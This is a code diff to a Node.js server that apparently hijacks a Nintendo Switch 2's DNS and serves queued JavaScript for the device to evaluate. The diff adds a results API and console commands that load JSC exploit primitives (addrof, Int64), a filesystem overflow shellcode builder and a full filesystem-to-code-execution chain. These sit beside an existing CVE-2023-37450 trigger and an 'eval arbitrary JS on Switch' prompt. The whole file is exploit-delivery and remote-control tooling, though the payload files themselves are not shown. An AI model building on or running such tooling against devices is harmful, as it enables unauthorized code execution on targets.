@@ -119,6 +119,7 @@ dns.on('error', err => {
 let cmdId = 0;
 const commands = [];
 const clients = {};
+const results = [];
 
 function readBody(req) {
   return new Promise((resolve, reject) => {
@@ -211,8 +212,17 @@ const httpServer = http.createServer(async (req, res) => {
     try {
       const body = JSON.parse(await readBody(req));
       console.log(`[${body.error ? 'ERR' : ' OK'}] ${body.result}`);
+      results.push({ cmdId: body.cmdId, result: body.result, error: body.error, ts: Date.now() });
+      if (results.length > 100) results.shift();
       jsonResp(res, 200, { ok: true });
     } catch (e) { jsonResp(res, 400, { error: e.message }); }
+    return;
+  }
+
+  if (req.method === 'GET' && req.url.startsWith('/api/results')) {
+    const url = new URL(req.url, 'http://localhost');
+    const last = Number(url.searchParams.get('last')) || 10;
+    jsonResp(res, 200, { results: results.slice(-last) });
     return;
   }
 
@@ -290,8 +300,10 @@ function startHTTP(dnsActive) {
     console.log('║  Capabilities stream here. Type JS to eval.          ║');
     console.log('║                                                      ║');
     console.log('╠═══════════════════════════════════════════════════════╣');
-    console.log('║  :trigger = CVE test  :exploit = full chain          ║');
-    console.log('║  :load <file>  :list  :caps  :help  :quit            ║');
+    console.log('║  :trigger = CVE test      :exploit = full chain      ║');
+    console.log('║  :primitives = JSC helpers :overflow = fs shellcode   ║');
+    console.log('║  :chain = fs exploit chain :load <file> = load JS    ║');
+    console.log('║  :list  :caps  :help  :quit                          ║');
     console.log('╚═══════════════════════════════════════════════════════╝');
     console.log('');
     console.log('Waiting for Switch 2 to connect...');
@@ -347,14 +359,44 @@ function startHTTP(dnsActive) {
           } catch(e) { console.log(`Failed: ${e.message}`); }
           rl.prompt(); return;
         }
+        if (t === ':primitives') {
+          const primPath = path.join(__dirname, 'jsc-primitives.js');
+          try {
+            const code = fs.readFileSync(primPath, 'utf8');
+            commands.push({ id: ++cmdId, type: 'eval', code });
+            console.log(`Loaded JSC primitives (${code.length} bytes, cmd #${cmdId})`);
+          } catch(e) { console.log(`Failed: ${e.message}`); }
+          rl.prompt(); return;
+        }
+        if (t === ':overflow') {
+          const scPath = path.join(__dirname, 'fs-overflow-shellcode.js');
+          try {
+            const code = fs.readFileSync(scPath, 'utf8');
+            commands.push({ id: ++cmdId, type: 'eval', code });
+            console.log(`Loaded fs overflow shellcode builder (${code.length} bytes, cmd #${cmdId})`);
+          } catch(e) { console.log(`Failed: ${e.message}`); }
+          rl.prompt(); return;
+        }
+        if (t === ':chain') {
+          const chainPath = path.join(__dirname, 'fs-exploit-chain.js');
+          try {
+            const code = fs.readFileSync(chainPath, 'utf8');
+            commands.push({ id: ++cmdId, type: 'eval', code });
+            console.log(`Loaded full fs exploit chain (${code.length} bytes, cmd #${cmdId})`);
+          } catch(e) { console.log(`Failed: ${e.message}`); }
+          rl.prompt(); return;
+        }
         if (t === ':help' || t === ':h') {
-          console.log('  :trigger  — send CVE-2023-37450 trigger test');
-          console.log('  :exploit  — send full exploit (all stages)');
-          console.log('  :load <f> — send any JS file as eval');
-          console.log('  :list     — show connected clients');
-          console.log('  :caps     — refresh capabilities');
-          console.log('  :quit     — exit');
-          console.log('  <js code> — eval arbitrary JS on Switch');
+          console.log('  :trigger     — send CVE-2023-37450 trigger test');
+          console.log('  :exploit     — send full exploit (all stages)');
+          console.log('  :primitives  — load JSC exploit primitives (Int64, addrof, etc)');
+          console.log('  :overflow    — load fs overflow shellcode builder');
+          console.log('  :chain       — load full fs→code-execution chain');
+          console.log('  :load <f>    — send any JS file as eval');
+          console.log('  :list        — show connected clients');
+          console.log('  :caps        — refresh capabilities');
+          console.log('  :quit        — exit');
+          console.log('  <js code>    — eval arbitrary JS on Switch');
           rl.prompt(); return;
         }
         commands.push({ id: ++cmdId, type: 'eval', code: t });
